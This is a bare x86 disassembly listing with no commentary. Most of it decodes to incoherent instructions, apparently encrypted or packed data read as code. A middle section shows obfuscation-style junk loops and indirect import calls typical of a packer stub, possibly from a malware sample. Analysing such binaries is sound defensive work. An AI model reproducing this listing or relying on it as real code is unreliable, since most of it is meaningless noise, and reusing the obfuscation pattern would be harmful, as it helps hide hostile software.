  4017eb:	jbe    0x40180d
  4017ed:	imul   ebp,DWORD PTR [esi-0x4],0x99a97f30
  4017f4:	clc    
  4017f5:	shl    BYTE PTR [edi],0x14
  4017f8:	ret    
  4017f9:	loopne 0x4017c6
  4017fb:	fsubr  QWORD PTR [ebp+0x21]
  4017fe:	leave  
  4017ff:	sar    eax,1
  401801:	adc    DWORD PTR [ebp+0x5037b93],ebx
  401807:	addr16 std 
  401809:	sub    al,0x88
  40180b:	aas    
  40180c:	push   0xffffffc3
  40180e:	test   BYTE PTR [eax+0x71],0xfc
  401812:	stos   DWORD PTR es:[di],eax
  401814:	xchg   esi,eax
  401815:	pop    edx
  401816:	data16 fild QWORD PTR [edx+ecx*8-0x69]
  40181b:	adc    al,0x74
  40181d:	ret    
  40181e:	fwait
  40181f:	shr    dh,cl
  401821:	data16 add ah,BYTE PTR [ecx]
  401824:	pop    ebx
  401825:	mov    edx,0x5b6f2b61
  40182a:	dec    esi
  40182b:	lods   eax,DWORD PTR ds:[esi]
  40182c:	lods   eax,DWORD PTR ds:[esi]
  40182d:	outs   dx,BYTE PTR ds:[esi]
  40182e:	cdq    
  40182f:	out    0x4,eax
  401831:	in     al,0x34
  401833:	lds    edx,FWORD PTR [ebp-0x125fc80c]
  401839:	pop    edx
  40183a:	xor    bl,BYTE PTR [ecx]
  40183c:	cmp    DWORD PTR [edi],0xdcb62c59
  401842:	out    dx,eax
  401843:	jbe    0x401849
  401845:	inc    edx
  401846:	inc    edx
  401847:	xor    bh,BYTE PTR [esi+0x3423965e]
  40184d:	ins    BYTE PTR es:[edi],dx
  40184e:	clc    
  40184f:	add    BYTE PTR [ecx+0x11],ch
  401852:	mov    ds:0x27e6860e,al
  401857:	stc    
  401858:	inc    edx
  401859:	jmp    0x350e:0x1dcfa1c1
  401860:	sub    BYTE PTR [edx],bl
  401862:	cmp    ebp,DWORD PTR [eax-0x444ca27d]
  401868:	add    ch,BYTE PTR [edi]
  40186a:	xor    DWORD PTR [ebx+0x7],ecx
  40186d:	jg     0x4018cc
  40186f:	sub    edi,DWORD PTR [ebp-0x15]
  401872:	mov    cl,0x8d
  401874:	loope  0x401823
  401876:	ja     0x40186a
  401878:	(bad)  ds:0x720d2ac9
  40187e:	mov    bl,0x46
  401880:	imul   ebx,ecx,0xb4e8b939
  401886:	neg    DWORD PTR [ecx]
  401888:	pop    edx
  401889:	dec    edx
  40188a:	xor    eax,0xee0360fc
  40188f:	inc    esp
  401890:	(bad)  
  401891:	push   ebx
  401892:	mov    edi,DWORD PTR [ebx]
  401894:	imul   esi,DWORD PTR [esi-0x48],0xd2428edc
  40189b:	sbb    DWORD PTR [ebp+0x1c],edi
  40189e:	ficomp WORD PTR [ebp+0x16]
  4018a1:	add    al,0x21
  4018a3:	nop
  4018a4:	sbb    ecx,0x12
  4018a7:	mov    ecx,edx
  4018a9:	fs pop eax
  4018ab:	call   0x1eab:0x23715d1a
  4018b2:	test   edx,edx
  4018b4:	or     ebp,DWORD PTR [edi-0x1796b6ac]
  4018ba:	dec    ebx
  4018bb:	push   cs
  4018bc:	cmp    edx,DWORD PTR [edi+0x3]
  4018bf:	mov    DWORD PTR [ecx+0x43373725],0x0
  4018c9:	add    cl,ch
  4018cb:	or     eax,0x8b000000
  4018d0:	sbb    eax,0x433737
  4018d5:	inc    ebx
  4018d6:	mov    DWORD PTR ds:0x433737,ebx
  4018dc:	cmp    DWORD PTR ds:0x433737,0x1c
  4018e3:	jae    0x401910
  4018e9:	cmp    DWORD PTR ds:0x433737,0x23
  4018f0:	jne    0x401901
  4018f6:	push   0x6ff2
  4018fb:	call   DWORD PTR ds:0x41228c
  401901:	jmp    0x4018cf
  401906:	mov    DWORD PTR ds:0x43372b,0x436b
  401910:	mov    DWORD PTR [ebp-0x38],eax
  401913:	mov    DWORD PTR [ebp-0x44],0xf89cb531
  40191a:	mov    DWORD PTR [ebp-0x54],0xf89f0531
  401921:	or     DWORD PTR ds:0x433677,edx
  401927:	mov    DWORD PTR [ebp-0x4c],0xf89c85f1
  40192e:	add    eax,DWORD PTR ds:0x43366b
  401934:	mov    DWORD PTR [ebp-0x3c],0xf89c85d1
  40193b:	xor    DWORD PTR ds:0x43372f,ecx
  401941:	mov    eax,DWORD PTR [ebp-0x10]
  401944:	xor    ebx,DWORD PTR ds:0x4336f3
  40194a:	xor    eax,esi
  40194c:	add    eax,edi
  40194e:	mov    DWORD PTR [ebp-0xc],eax
  401951:	mov    DWORD PTR [ebp-0x28],0xf89c853e
  401958:	sbb    ebx,ebx
  40195a:	mov    BYTE PTR [ebp-0x11],0x67
  40195e:	sub    DWORD PTR ds:0x433667,0x1011
  401968:	mov    eax,DWORD PTR [ebp-0x10]
  40196b:	xor    eax,esi
  40196d:	add    eax,edi
  40196f:	sbb    DWORD PTR ds:0x433633,0x6b1e
  401979:	mov    DWORD PTR [ebp-0xc],eax
  40197c:	mov    eax,DWORD PTR [ebp-0x3c]
  40197f:	xor    eax,esi
  401981:	xor    DWORD PTR ds:0x43366f,0x46ad
  40198b:	add    eax,edi
  40198d:	mov    DWORD PTR [ebp-0x34],eax
  401990:	mov    eax,DWORD PTR [ebp-0x44]
  401993:	mov    DWORD PTR ds:0x433667,0x12
  40199d:	cmp    DWORD PTR ds:0x433667,0x0
  4019a4:	je     0x4019f8
  4019aa:	cmp    DWORD PTR ds:0x433667,0x7
  4019b1:	jne    0x4019c2
  4019b7:	push   0x433767
  4019bc:	call   DWORD PTR ds:0x4121b8
  4019c2:	cmp    DWORD PTR ds:0x433667,0x8
  4019c9:	jne    0x4019dc
  4019cf:	mov    ebx,DWORD PTR ds:0x433667
  4019d5:	dec    ebx
  4019d6:	mov    DWORD PTR ds:0x433667,ebx
  4019dc:	mov    ebx,DWORD PTR ds:0x433667
  4019e2:	dec    ebx
  4019e3:	mov    DWORD PTR ds:0x433667,ebx
  4019e9:	jmp    0x40199d
  4019ee:	and    DWORD PTR ds:0x433613,0x446b
  4019f8:	xor    eax,esi
  4019fa:	add    eax,edi
  4019fc:	not    ebx
  4019fe:	mov    DWORD PTR [ebp-0x30],eax
  401a01:	sub    ebx,DWORD PTR ds:0x4336f7
  401a07:	mov    eax,DWORD PTR [ebp-0x28]
  401a0a:	add    ecx,ecx
  401a0c:	xor    eax,esi
  401a0e:	and    DWORD PTR ds:0x4336eb,0x0
  401a18:	jmp    0x401a2a
  401a1d:	mov    ebx,DWORD PTR ds:0x4336eb
  401a23:	inc    ebx
  401a24:	mov    DWORD PTR ds:0x4336eb,ebx
  401a2a:	cmp    DWORD PTR ds:0x4336eb,0x18
  401a31:	jae    0x401f27
  401a37:	cmp    DWORD PTR ds:0x4336eb,0xa
  401a3e:	jne    0x401a4f
  401a44:	push   0x1a57
  401a49:	call   DWORD PTR ds:0x412350
  401a4f:	cmp    DWORD PTR ds:0x4336eb,0x9
  401a56:	jne    0x401a6b
  401a5c:	xor    ebx,ebx
  401a5e:	xor    ebx,DWORD PTR ds:0x4336eb
  401a64:	inc    ebx
  401a65:	mov    DWORD PTR ds:0x4336eb,ebx
  401a6b:	jmp    0x401a1d
  401a70:	mov    DWORD PTR ds:0x433617,0x13
  401a7a:	cmp    DWORD PTR ds:0x433617,0x0
  401a81:	je     0x401f27
  401a87:	cmp    DWORD PTR ds:0x433617,0xa
  401a8e:	jne    0x401a9f
  401a94:	push   0x764e
  401a99:	call   DWORD PTR ds:0x412290
  401a9f:	cmp    DWORD PTR ds:0x433617,0xb
  401aa6:	jne    0x401abb
  401aac:	xor    ecx,ecx
  401aae:	xor    ecx,DWORD PTR ds:0x433617
  401ab4:	dec    ecx
  401ab5:	mov    DWORD PTR ds:0x433617,ecx
  401abb:	mov    ecx,DWORD PTR ds:0x433617
  401ac1:	dec    ecx
  401ac2:	mov    DWORD PTR ds:0x433617,ecx
  401ac8:	jmp    0x401a7a
  401acd:	and    DWORD PTR ds:0x433677,0x0
  401ad7:	jmp    0x401ae9
  401adc:	mov    ecx,DWORD PTR ds:0x433677
  401ae2:	inc    ecx
  401ae3:	mov    DWORD PTR ds:0x433677,ecx
  401ae9:	cmp    DWORD PTR ds:0x433677,0x1c
  401af0:	jae    0x401f27
  401af6:	cmp    DWORD PTR ds:0x433677,0x1d
  401afd:	jne    0x401b0e
  401b03:	push   0x3c99
  401b08:	call   DWORD PTR ds:0x412294
  401b0e:	jmp    0x401adc
  401b13:	xor    DWORD PTR ds:0x433677,ecx
  401b19:	jmp    0x401f27
  401b1e:	mov    cl,0x40
  401b20:	(bad)  
  401b21:	mul    DWORD PTR es:[ecx+0x73ea5171]
  401b28:	cmp    edx,DWORD PTR [ebx-0x2b]
  401b2b:	pusha  
  401b2c:	das    
  401b2d:	sbb    al,0x5c
  401b2f:	jns    0x401baf
  401b31:	jle    0x401ba2
  401b33:	jge    0x401bb3
  401b35:	jle    0x401b6c
  401b37:	shl    bh,cl
  401b39:	xchg   esp,eax
  401b3a:	cmp    al,0x2c
  401b3c:	bound  esp,QWORD PTR [esi]
  401b3e:	in     al,0x13
  401b40:	and    BYTE PTR [eax+0x5a],bh
  401b43:	jmp    0xe8eb:0x15aecc8b
  401b4a:	call   0x8e5e2a26
  401b4f:	pop    es
  401b50:	mov    cl,0x66
  401b52:	dec    esp
  401b53:	fsubr  QWORD PTR [edi-0x6c8ff1e9]
  401b59:	cmp    ebx,ecx
  401b5b:	and    eax,0xac0931bc
  401b60:	xchg   ecx,eax
  401b61:	and    dh,BYTE PTR [edi]
  401b63:	xor    ebx,ebx
  401b65:	mov    ah,0xd0
  401b67:	jbe    0x401b97
  401b69:	popf   
  401b6a:	jns    0x401b52
  401b6c:	jne    0x401be6
  401b6e:	lods   al,BYTE PTR fs:[esi]
  401b70:	jbe    0x401bd3
  401b72:	test   BYTE PTR fs:[ecx-0x5e462cab],bl
  401b79:	dec    edi
  401b7a:	mov    ecx,DWORD PTR [esi+eiz*8]
  401b7d:	mov    ah,0x6c
  401b7f:	inc    esp
  401b80:	xlat   BYTE PTR ds:[ebx]
  401b81:	fldenv [edx-0xaeddb79]
  401b87:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401b88:	add    edi,ebx
  401b8a:	pop    ss
  401b8b:	jl     0x401b74
  401b8d:	jg     0x401b35
  401b8f:	dec    ebp
  401b90:	xchg   edx,eax
  401b91:	sub    BYTE PTR [edx-0x41],bh
  401b94:	xchg   esi,eax
  401b95:	int    0x47
  401b97:	jae    0x401bbb
  401b99:	mov    ah,0xe
  401b9b:	pop    edx
  401b9c:	and    dl,BYTE PTR [ecx]
  401b9e:	outs   dx,DWORD PTR ds:[esi]
  401b9f:	xchg   ecx,eax
  401ba0:	js     0x401b7e
  401ba2:	das    
  401ba3:	cmp    DWORD PTR [ecx],eax
  401ba5:	pop    ss
  401ba6:	cmp    cl,bh
  401ba8:	sbb    al,0xf7
  401baa:	fstp   QWORD PTR [edi-0x55]
  401bad:	sub    bl,BYTE PTR ds:0x649bd358
  401bb3:	sbb    BYTE PTR [eax],ch
  401bb5:	push   esi
  401bb6:	sti    
  401bb7:	add    al,0x4e
  401bb9:	test   BYTE PTR [ebx-0x42574b95],cl
  401bbf:	fxch   st(5)
  401bc1:	jnp    0x401c38
  401bc3:	mov    cl,0xa2
  401bc5:	push   edx
  401bc6:	and    BYTE PTR [edi+0xf],dh
  401bc9:	or     BYTE PTR [edx+0x6f23350c],0xf4
  401bd0:	pop    esi
  401bd1:	add    al,bh
  401bd3:	push   0x2071d2dd
  401bd8:	pop    esi
  401bd9:	std    
  401bda:	push   esi
  401bdb:	data16 mov al,ds:0x48ada233
  401be1:	ret    0xacaa
  401be4:	mov    ebx,0xb00bff34
  401be9:	xchg   DWORD PTR [ecx-0x61],ecx
  401bec:	mov    ebp,?
  401bee:	or     al,0x87
  401bf0:	ror    BYTE PTR [ecx+ebp*1],0xa4
  401bf4:	sub    edx,DWORD PTR [esi-0x56]
  401bf7:	mov    edx,0xd2310dff
  401bfc:	dec    eax
  401bfd:	ins    DWORD PTR es:[edi],dx
  401bfe:	(bad)  
  401bff:	out    0x7c,eax
  401c01:	cmc    
  401c02:	test   bh,dl
  401c04:	jg     0x401c04
  401c06:	fisubr DWORD PTR [edx-0x3c]
  401c09:	jne    0x401c16
  401c0b:	mov    bl,BYTE PTR [esi]
  401c0d:	sub    ch,bl
  401c0f:	ffreep st(2)
  401c11:	fimul  WORD PTR [eax]
  401c13:	dec    eax
  401c14:	rcr    DWORD PTR [ecx],1
  401c16:	sub    BYTE PTR [esi],al
  401c18:	xchg   BYTE PTR [ebx],ch
  401c1a:	scas   al,BYTE PTR es:[edi]
  401c1b:	push   ecx
  401c1c:	or     ebp,edi
  401c1e:	shr    esi,0x24
  401c21:	sub    ah,BYTE PTR [ebx]
  401c23:	inc    edi
  401c24:	sbb    esp,DWORD PTR [edx+0x6dd8e377]
  401c2a:	ins    BYTE PTR es:[edi],dx
  401c2b:	xchg   esi,eax
  401c2c:	fadd   DWORD PTR [ebp+0x33c42a78]
  401c32:	push   edi
  401c33:	call   0x5b53abd
  401c38:	jne    0x401c71
  401c3a:	mov    dh,0xb
  401c3c:	or     bl,BYTE PTR [ebx-0x625c9f37]
  401c42:	or     edx,DWORD PTR [edx]
  401c44:	lahf   
  401c45:	call   0x25ed:0x46713002
  401c4c:	mov    ch,0x17
  401c4e:	pop    edi
  401c4f:	lsl    ebp,WORD PTR [esi+ebp*2+0x2e623a83]
  401c57:	fnstsw WORD PTR [esi]
  401c59:	jns    0x401c53
  401c5b:	or     DWORD PTR [eax+0x22d1f6b9],edi
  401c61:	or     eax,0x1137bfae
  401c66:	and    al,0xa3
  401c68:	fistp  QWORD PTR [ecx+0x1e]
  401c6b:	xchg   edx,eax
  401c6c:	call   0x8c58b76f
  401c71:	scas   eax,DWORD PTR es:[edi]
  401c72:	addr16 xchg ebx,eax
  401c74:	repnz xor edx,DWORD PTR [ebx-0x66]
  401c78:	and    al,0x42
  401c7a:	push   esp
  401c7b:	mov    edx,0x690ceed5
  401c80:	iret   
  401c81:	cmp    ebp,eax
  401c83:	or     ebx,edx
  401c85:	mov    bl,ah
  401c87:	sbb    esi,DWORD PTR [ecx-0x11828f00]
  401c8d:	and    BYTE PTR [ecx-0x17d6f2dd],cl
  401c93:	in     al,dx
  401c94:	mov    ah,0xc5
  401c96:	jbe    0x401c48
  401c98:	mov    ah,0x85
  401c9a:	test   al,0xc3
  401c9c:	scas   eax,DWORD PTR es:[edi]
  401c9d:	xchg   esp,eax
  401c9e:	lods   eax,DWORD PTR ds:[esi]
  401c9f:	jb     0x401d20
  401ca1:	jmp    0x40de8026
  401ca6:	mov    ds:0x818a85b7,eax
  401cab:	jmp    0x72d12961
  401cb0:	pop    edx
  401cb1:	xlat   BYTE PTR ds:[ebx]
  401cb2:	ins    DWORD PTR es:[edi],dx
  401cb3:	push   0x6451d2da
  401cb8:	jp     0x401c98
  401cba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401cbb:	fmul   st(5),st
  401cbd:	xchg   esi,eax
  401cbe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401cbf:	sbb    DWORD PTR [edx+ecx*2+0x77],ecx
  401cc3:	jecxz  0x401cd5
  401cc5:	in     eax,dx
  401cc6:	cli    
  401cc7:	dec    ebx
  401cc8:	inc    edi
  401cc9:	mov    eax,0x867a7bc4
  401cce:	jmp    0x401cca
  401cd0:	mov    ebx,0x87669306
  401cd5:	cs adc ebx,esi
  401cd8:	mov    dl,0xbd
  401cda:	xor    eax,0x81171157
  401cdf:	retf   0xebbd
  401ce2:	sub    BYTE PTR [ebx+0x3fb4ee53],ch
  401ce8:	mov    cl,0xdf
  401cea:	sbb    BYTE PTR [edx+0x1223961d],ah
  401cf0:	dec    ebx
  401cf1:	sbb    eax,0x8f848357
  401cf6:	add    al,0xa4
  401cf8:	inc    esp
  401cf9:	(bad)  
  401cfa:	outs   dx,DWORD PTR ds:[esi]
  401cfb:	leave  
  401cfc:	mov    eax,ds:0x406f14b9
  401d01:	repnz into 
  401d03:	add    DWORD PTR [ecx-0x74],ebp
  401d06:	lock sti 
  401d08:	adc    edx,ebp
  401d0a:	inc    ebx
  401d0b:	xor    al,0xff
  401d0d:	sahf   
  401d0e:	lea    ebx,[ecx+0x7c42e67a]
  401d14:	sbb    edx,DWORD PTR [ecx+0x6b]
  401d17:	mov    cl,0x1
  401d19:	lea    ebx,[ebx-0x4f98a241]
  401d1f:	cmp    al,0xfb
  401d21:	pop    ecx
  401d22:	and    BYTE PTR [edi+0x25a702ef],cl
  401d28:	or     eax,0xf0af6ee6
  401d2d:	imul   ebx,DWORD PTR [ebx],0x67d3b2fb
  401d33:	clc    
  401d34:	aad    0x49
  401d36:	cdq    
  401d37:	jge    0x401cf3
  401d39:	(bad)
  401d3c:	add    BYTE PTR [edx],bh
  401d3e:	data16 mov bl,BYTE PTR [esi+0x67]
  401d42:	icebp  
  401d43:	popf   
  401d44:	out    0xb7,eax
  401d46:	test   ecx,eax
  401d48:	adc    dh,BYTE PTR [eax-0x3]
  401d4b:	js     0x401d3a
  401d4d:	inc    esi
  401d4e:	inc    ebp
  401d4f:	xor    eax,0x6c04e519
  401d54:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401d55:	inc    edi
  401d56:	xchg   ebx,eax
  401d57:	mov    esp,DWORD PTR [ebx]
  401d59:	stc    
  401d5a:	adc    al,0xae
  401d5c:	lds    esi,FWORD PTR [ebp-0x6d]
  401d5f:	xor    ebx,DWORD PTR [eax-0x73]
  401d62:	cmp    eax,0x11986a3a
  401d67:	mov    edx,0xecd182c3
  401d6c:	inc    edx
  401d6d:	cmc    
  401d6e:	xchg   ebp,eax
  401d6f:	dec    edx
  401d70:	or     eax,0x4cc48517
  401d75:	or     BYTE PTR [eax],dl
  401d77:	mov    ah,0x50
  401d79:	nop
  401d7a:	idiv   al
  401d7c:	mov    edi,0x9d2b4b3b
  401d81:	je     0x401dae
  401d83:	enter  0x4dbf,0xaa
  401d87:	mov    esi,0x1134fa15
  401d8c:	mov    edi,ebx
  401d8e:	test   al,0xb7
  401d90:	mov    DWORD PTR [ecx-0x7dc8b5ea],ebp
  401d96:	test   eax,0xf3e5d536
  401d9b:	dec    esi
  401d9c:	push   esp
  401d9d:	adc    ebx,0x84ac72a0
  401da3:	inc    ecx
  401da4:	sub    al,0xba
  401da6:	sub    eax,0x56f6dbd7
  401dab:	(bad)  
  401dac:	pop    ebx
  401dad:	out    dx,al
  401dae:	cmc    
  401daf:	inc    ecx
  401db0:	xchg   DWORD PTR [ebx],ecx
  401db2:	mov    bl,0xc5
  401db4:	sbb    BYTE PTR [eax+0x5ca462e4],bh
  401dba:	xor    edx,esp
  401dbc:	xor    al,0x52
  401dbe:	mov    DWORD PTR [edi],eax
  401dc0:	mov    esp,0x64423aaa
  401dc5:	xchg   edx,eax
  401dc6:	jbe    0x401d5b
  401dc8:	cwde   
  401dc9:	push   edi
  401dca:	push   es
  401dcb:	mov    cs,WORD PTR [ebp-0x53ce47a2]
  401dd1:	dec    eax
  401dd2:	push   ebx
  401dd3:	push   edx
  401dd4:	xor    DWORD PTR ds:0x5b65e4a2,esp
  401dda:	pop    eax
  401ddb:	ror    DWORD PTR [esi+edi*2],cl
  401dde:	(bad)  
  401ddf:	(bad)  
  401de0:	stos   BYTE PTR es:[edi],al
  401de1:	ins    BYTE PTR es:[edi],dx
  401de2:	fcmovnbe st,st(6)
  401de4:	cmp    al,0x43
  401de6:	jmp    0x5c82ef9d
  401deb:	adc    DWORD PTR [edx+0x67dafd1f],eax
  401df1:	jle    0x401dcc
  401df3:	ret    0x3c6e
  401df6:	in     al,0xe3
  401df8:	retf   
  401df9:	and    eax,0xf4ae77b
  401dfe:	stos   DWORD PTR es:[edi],eax
  401dff:	xor    dl,BYTE PTR [edi-0x7b]
  401e02:	arpl   WORD PTR [esi-0x55d073a2],dx
  401e08:	pop    eax
  401e09:	fs xchg ecx,eax
  401e0b:	push   ss
  401e0c:	or     DWORD PTR [esi+0x65],ebp
  401e0f:	mov    edx,0xf5843fdc
  401e14:	pop    esp
  401e15:	sbb    DWORD PTR [ebx*8+0x71d04d7f],esi
  401e1c:	and    al,BYTE PTR [eax]
  401e1e:	xchg   esi,eax
  401e1f:	sub    DWORD PTR [edx-0x48],ecx
  401e22:	mov    ds:0x33a78fc9,eax
  401e27:	and    eax,0x19927840
  401e2c:	adc    eax,0xb0aca90d
  401e31:	scas   eax,DWORD PTR es:[edi]
  401e32:	aam    0x66
  401e34:	es mov dl,0xbb
  401e37:	pushf  
  401e38:	mul    BYTE PTR [ebp+ecx*2-0x2f]
  401e3c:	xor    al,0xe9
  401e3e:	xrelease mov BYTE PTR [edx+0x5c8f6eef],ch
  401e45:	aas    
  401e46:	ret    
  401e47:	mov    al,0x9c
  401e49:	ret    0xc9d0
  401e4c:	adc    al,0x5b
  401e4e:	div    BYTE PTR [edx]
  401e50:	dec    esi
  401e51:	rcl    esi,0xd8
  401e54:	(bad)  
  401e55:	pop    esp
  401e56:	inc    edi
  401e57:	int    0x9e
  401e59:	push   esi
  401e5a:	xchg   edx,edx
  401e5c:	mov    bl,ah
  401e5e:	scas   eax,DWORD PTR es:[edi]
  401e5f:	inc    ebx
  401e60:	loope  0x401e53
  401e62:	femms  
  401e64:	cld    
  401e65:	cmp    esi,esi
  401e67:	int3   
  401e68:	inc    BYTE PTR [ecx+0x2b]
  401e6b:	push   edi
  401e6c:	cld    
  401e6d:	ror    BYTE PTR [esi+0x6acf9a29],1
  401e73:	call   0xadd4a228
  401e78:	rcr    BYTE PTR [edx-0x520f79d2],0x2d
  401e7f:	dec    eax
  401e81:	push   ebp
  401e82:	aam    0x6d
  401e84:	jnp    0x401eda
  401e86:	jl     0x401e94
  401e88:	push   es
  401e89:	push   0x7d
  401e8b:	mov    WORD PTR [esi-0x3e],fs
  401e8e:	mul    DWORD PTR [eax+ecx*2+0x4]
  401e92:	stos   BYTE PTR es:[edi],al
  401e93:	neg    BYTE PTR ds:0xf6c88df5
  401e99:	rol    DWORD PTR [ebx+0x2c9e4f4d],1
  401e9f:	call   0x155af091
  401ea4:	cdq    
  401ea5:	int3   
  401ea6:	jecxz  0x401eb4
  401ea8:	and    DWORD PTR ds:0x469cbce0,eax
  401eae:	push   esp
  401eaf:	and    esp,esp
  401eb1:	loopne 0x401f0b
  401eb3:	out    0x16,al
  401eb5:	mov    dl,0xe0
  401eb7:	mov    esp,0x807fdb60
  401ebc:	cli    
  401ebd:	shl    DWORD PTR [edi],0x54
  401ec0:	mov    gs,WORD PTR [edx+0x3a]
  401ec3:	add    DWORD PTR [ebx],edi
  401ec5:	or     al,BYTE PTR [edx+0xd]
  401ec8:	sbb    ch,bl
  401eca:	sub    eax,0x81db59e5
  401ecf:	sub    cl,dh
  401ed1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401ed2:	repnz or eax,0xdd56a3ce
  401ed8:	popf   
  401ed9:	clc    
  401eda:	xor    ebx,DWORD PTR [ecx]
  401edc:	mov    dh,0xa4
  401ede:	sub    al,0x83
  401ee0:	pop    ebx
  401ee1:	sahf   
  401ee2:	inc    edi
  401ee3:	es dec ecx
  401ee5:	add    ah,ch
  401ee7:	outs   dx,DWORD PTR ds:[esi]
  401ee8:	mov    ds:0x5f6cbcca,al
  401eed:	mov    cl,0x69
  401eef:	mov    ebx,0x480452c1
  401ef4:	pop    esi
  401ef5:	fist   WORD PTR gs:[eax+0x52]
  401ef9:	ds pop es
  401efb:	push   0x6d2cff1
  401f00:	or     DWORD PTR [ecx-0x3],0x4f
  401f04:	sub    al,0x1d
  401f06:	je     0x401f61
  401f08:	ror    BYTE PTR [eax-0x4b],cl
  401f0b:	lahf   
  401f0c:	jmp    0x401ef8
  401f0e:	out    0x5e,eax
  401f10:	jg     0x401f21
  401f12:	mov    eax,0xfe75b4d
  401f17:	out    0xd8,eax
  401f19:	(bad)  
  401f1a:	sar    BYTE PTR [eax-0x7da589bf],cl
  401f20:	test   BYTE PTR [edi-0x613fcc],cl
  401f26:	push   esp
  401f27:	add    eax,edi
  401f29:	mov    ebx,DWORD PTR ds:0x43370b
  401f2f:	mov    ecx,DWORD PTR ds:0x433757
  401f35:	sub    ecx,ebx
  401f37:	add    ebx,DWORD PTR [ebx+ecx*1]
  401f3a:	mov    DWORD PTR [ebp-0x2c],eax
  401f3d:	mov    ebx,DWORD PTR ds:0x433747
  401f43:	mov    ebx,DWORD PTR [ebx]
  401f45:	xor    DWORD PTR ds:0x43361b,ebx
  401f4b:	jmp    0x402359
  401f50:	lahf   
  401f51:	in     al,dx
  401f52:	leave  
  401f53:	dec    DWORD PTR [ecx-0x65]
  401f56:	imul   ebp,esp,0xaa49c393
  401f5c:	fwait
  401f5d:	mov    ebp,0x54dd7a5
  401f62:	jle    0x401fe2
  401f64:	outs   dx,DWORD PTR ds:[esi]
  401f65:	jge    0x401fe5
  401f67:	jle    0x401f87
  401f69:	add    dh,BYTE PTR [ebx]
  401f6b:	shl    DWORD PTR [ebp+0x1f],1
  401f6e:	jae    0x401f3b
  401f70:	das    
  401f71:	ins    DWORD PTR es:[edi],dx
  401f72:	pop    esp
  401f73:	add    BYTE PTR [esi+0x6e179d3c],dh
  401f79:	stc    
  401f7a:	mov    cl,0x95
  401f7c:	adc    DWORD PTR [ebp+0x6020c996],ecx
  401f82:	mov    eax,0xc182452c
  401f87:	pop    edi
  401f88:	popa   
  401f89:	cmp    al,al
  401f8b:	aad    0xf2
  401f8d:	mov    ebp,0x878d1b29
  401f92:	add    bp,WORD PTR [ebp+0x7d]
  401f96:	mov    dh,0xbd
  401f98:	aaa    
  401f99:	jo     0x401fbd
  401f9b:	pop    esp
  401f9c:	mov    ds:0xaff76c76,al
  401fa1:	push   ecx
  401fa2:	aas    
  401fa3:	mov    eax,0x3ebfa89d
  401fa8:	jecxz  0x401fce
  401faa:	add    DWORD PTR [eax+edi*8],0x18
  401fae:	mov    bl,0x29
  401fb0:	cmp    BYTE PTR [ebp+0x44],0x89
  401fb4:	addr16 xchg ebp,eax
  401fb6:	and    BYTE PTR [edx-0x5a],cl
  401fb9:	ret    
  401fba:	push   eax
  401fbb:	sahf   
  401fbc:	outs   dx,DWORD PTR ds:[esi]
  401fbd:	mov    ds:0x5df928a1,al
  401fc2:	pusha  
  401fc3:	add    DWORD PTR [ebp+0x2a],esi
  401fc6:	pop    ss
  401fc7:	sbb    bl,BYTE PTR [ecx+0x5f]
  401fca:	or     dh,dl
  401fcc:	pop    esp
  401fcd:	jo     0x401f81
  401fcf:	add    ecx,0xbd1939ad
  401fd5:	sahf   
  401fd6:	sbb    edx,esp
  401fd8:	icebp  
  401fd9:	ret    0xb823
  401fdc:	popa   
  401fdd:	lds    ecx,FWORD PTR [edx+0x6697f710]
  401fe3:	(bad)  
  401fe4:	nop
  401fe5:	repnz fs xor eax,0xd480722b
  401fec:	addr16 push es
  401fee:	lods   al,BYTE PTR ds:[esi]
  401fef:	push   esi
  401ff0:	sub    al,0xd9
  401ff2:	stos   BYTE PTR es:[edi],al
  401ff3:	sbb    al,0x62
  401ff5:	inc    esp
  401ff6:	sub    DWORD PTR ds:0x894cfb2b,0xe1ecb808
  402000:	push   edi
  402001:	loopne 0x402032
  402003:	and    eax,0xbd9e9ac8
  402008:	mov    edx,0xa04c21ef
  40200d:	xor    BYTE PTR [edi],ah
  40200f:	or     BYTE PTR [esi],dl
  402011:	mov    esp,0xe208f028
  402016:	mov    WORD PTR ds:0xcd29a43e,fs
  40201c:	ffreep st(1)
  40201e:	aas    
  40201f:	add    eax,ecx
  402021:	lea    edx,[edx-0x4ab8b0b]
  402027:	mov    ds:0xf67f9d4d,eax
  40202c:	ficom  DWORD PTR [ebx+0x9]
  40202f:	loopne 0x401fd1
  402031:	inc    ecx
  402032:	mov    esp,DWORD PTR [eax+0xade6f67]
  402038:	cdq    
  402039:	xchg   DWORD PTR [ecx],ebx
  40203b:	lea    eax,[ecx]
  40203d:	dec    edi
  40203e:	inc    edi
  40203f:	xchg   esi,eax
  402040:	jg     0x40207e
  402042:	push   0xa9d85b7f
  402047:	lahf   
  402048:	push   ds
  402049:	mov    al,0x4f
  40204b:	outs   dx,DWORD PTR ds:[esi]
  40204c:	std    
  40204d:	ds or  dl,bh
  402050:	mov    bl,0x5c
  402052:	aam    0xd3
  402054:	push   ds
  402055:	popa   
  402056:	xchg   edx,eax
  402057:	fldenv [ecx+0x7c]
  40205a:	jge    0x4020b3
  40205c:	jb     0x401ffc
  40205e:	out    0xbb,al
  402060:	and    BYTE PTR [esi+eax*8],bh
  402063:	popa   
  402064:	pop    edx
  402065:	lea    esi,[ebx+0x34708213]
  40206b:	mov    ebx,0x45107e5
  402070:	push   0xffffffa8
  402072:	(bad)  
  402073:	repz pusha 
  402075:	retf   
  402076:	push   edx
  402077:	stos   BYTE PTR es:[edi],al
  402078:	into   
  402079:	sbb    dh,BYTE PTR ds:0x92263b9f
  40207f:	ret    0x692d
  402082:	xchg   esp,eax
  402083:	pop    edi
  402084:	shufps xmm6,xmm4,0xdb
  402088:	loope  0x40201f
  40208a:	pop    ss
  40208b:	inc    edi
  40208c:	fist   DWORD PTR [edi]
  40208e:	fadd   st(0),st
  402090:	(bad)  
  402092:	push   ss
  402093:	cli    
  402094:	adc    cl,bl
  402096:	push   eax
  402097:	dec    ecx
  402098:	bound  esp,QWORD PTR [edx]
  40209a:	imul   eax,ebp,0x24
  40209d:	inc    esi
  40209e:	popf   
  40209f:	lds    ebp,FWORD PTR [esi+ebx*1-0x77]
  4020a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4020a4:	nop
  4020a5:	sub    DWORD PTR [edi-0x4f97f054],ebp
